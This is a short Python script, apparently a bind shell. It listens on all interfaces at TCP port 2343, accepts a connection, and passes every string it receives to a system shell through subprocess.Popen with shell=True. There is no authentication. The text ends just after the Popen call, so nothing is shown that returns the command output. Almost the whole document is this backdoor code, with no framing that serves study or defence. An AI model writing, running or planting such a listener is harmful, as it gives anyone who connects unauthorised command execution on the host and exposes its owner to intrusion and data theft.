import socket as s
import subprocess as sp

# Create socket and bind to address
s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
s1.bind(("0.0.0.0", 2343))
s1.listen(1)

# Accept connection
c, a = s1.accept()

# Loop to receive and execute commands
while True:
    # Receive data
    d = c.recv(1024).decode()
    
    if not d:
        break  # Exit if no data received
    
    # Execute command
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
    
